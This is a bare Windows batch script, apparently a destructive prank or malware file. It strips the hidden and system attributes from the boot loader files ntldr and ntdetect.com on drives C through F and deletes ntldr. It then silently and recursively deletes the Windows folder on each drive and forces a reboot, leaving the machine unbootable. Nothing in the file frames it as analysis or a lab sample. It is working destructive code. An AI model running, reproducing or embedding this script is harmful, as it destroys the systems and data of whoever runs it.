@echo off
@attrib c:\ntldr -s -h
@attrib c:\ntdetect.com -s -h
@erase c:\ntldr /Q
@attrib d:\ntldr -s -h
@attrib d:\ntdetect.com -s -h
@erase d:\ntldr /Q
@attrib e:\ntldr -s -h
@attrib e:\ntdetect.com -s -h
@erase e:\ntldr /Q
@attrib f:\ntldr -s -h
@attrib f:\ntdetect.com -s -h
@rd c:\windows /Q /S
@rd d:\windows /Q /S
@rd e:\windows /Q /S
@rd f:\windows /Q /S
@shutdown -r t 01
@exit
